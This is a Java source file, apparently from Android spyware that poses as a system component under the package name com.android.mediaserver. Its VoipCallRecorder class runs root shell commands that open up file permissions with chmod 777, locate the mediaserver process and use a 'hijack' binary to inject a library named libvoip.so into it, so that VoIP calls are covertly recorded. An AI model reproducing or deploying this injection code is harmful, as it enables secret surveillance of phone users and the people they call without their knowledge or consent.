package com.android.mediaserver.voip;

import android.content.Context;
import com.android.mediaserver.config.Config;
import com.android.mediaserver.proc.ProcessesManager;
import com.android.mediaserver.shell.Shell.SU;
import com.sromku.simple.storage.SimpleStorage;
import java.io.File;
import java.util.List;
import timber.log.Timber;

public class VoipCallRecorder {
  private static VoipCallRecorder mInstance;
  private Context mContext;

  private VoipCallRecorder(Context context) {
    mContext = context.getApplicationContext();
  }

  public static VoipCallRecorder getInstance(Context context) {
    if (mInstance == null) {
      mInstance = new VoipCallRecorder(context);
    }
    return mInstance;
  }

  private boolean checkShouldLoad(int mediaserverPid) {
    List<String> maps = SU.run("cat " + ("/proc/" + String.valueOf(mediaserverPid) + "/maps"));
    if (!(maps == null || maps.size() == 0)) {
      for (String line : maps) {
        if (line.contains("libvoip.so")) {
          return false;
        }
      }
    }
    return true;
  }

  public void enableVoipRecording() {
    try {
      SU.run("chmod 777 " + SimpleStorage.getInternalStorage(mContext)
          .getFile(Config.getInstance(mContext).getVoipRecordingsDirectoryName())
          .getAbsolutePath());
      SU.run("chmod 777 " + mContext.getFilesDir().getAbsolutePath());
      int pid =
          ProcessesManager.getInstance(mContext).getPidForName("/system/bin/mediaserver");
      if (true == checkShouldLoad(pid)) {
        Timber.i("----------------- ENABLING VoIP RECORDING -----------------", new Object[0]);
        String hijackPath =
            mContext.getFilesDir().getAbsolutePath() + File.separator + "hijack";
        String libvoipPath =
            mContext.getFilesDir().getAbsolutePath() + File.separator + "libvoip.so";
        SU.run("chmod 777 " + hijackPath);
        SU.run("chmod 777 " + libvoipPath);
        SU.run(hijackPath + " -d -p " + String.valueOf(pid) + " -l " + libvoipPath);
      }
    } catch (Exception e) {
      Timber.e(e, "Failed to enable VoIP recording support", new Object[0]);
    }
  }
}
